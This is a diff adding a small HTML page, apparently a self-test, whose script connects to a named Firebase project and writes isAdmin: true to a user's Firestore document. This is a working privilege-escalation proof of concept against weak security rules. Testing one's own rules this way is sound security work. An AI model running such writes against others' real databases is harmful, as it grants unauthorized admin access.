@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Firebase Security Test</title>
+</head>
+<body>
+  <h1>Testing Admin Privilege Escalation</h1>
+  <p>Check the browser's developer console (press F12) to see the result.</p>
+
+  <script type="module">
+    // Import necessary functions
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+    // Your web configuration
+    const firebaseConfig = {
+      apiKey: 'AIzaSyB6xZ14ClFl4LhHtI6PAU_nsV0ZRLTw-8o',
+      appId: '1:1093996912048:web:882a8e0ace1869f6484a75',
+      messagingSenderId: '1093996912048',
+      projectId: 'red-alix-albi--abc',
+      authDomain: 'red-alix-albi--abc.firebaseapp.com',
+      storageBucket: 'red-alix-albi--abc.firebasestorage.app',
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // --- Function to update a user and make them an admin ---
+    async function escalateUserToAdmin(userId) {
+      console.log(`Attempting to make user ${userId} an admin...`);
+      try {
+        const userDocRef = doc(db, "users", userId);
+        
+        // This is the malicious update
+        await updateDoc(userDocRef, {
+          isAdmin: true
+        });
+
+        console.log(`✅ SUCCESS: User ${userId} is now an admin. Check the Firestore console.`);
+      } catch (error) {
+        console.error(`❌ FAILED to update user ${userId}:`, error.message);
+      }
+    }
+
+    // --- Run the test on your test account ID from the logs ---
+    const testAccountUserId = 'Y6OJ2EzoekNhynK0K2EaV09rYBq2'; 
+    await escalateUserToAdmin(testAccountUserId);
+
+  </script>
+</body>
+</html>
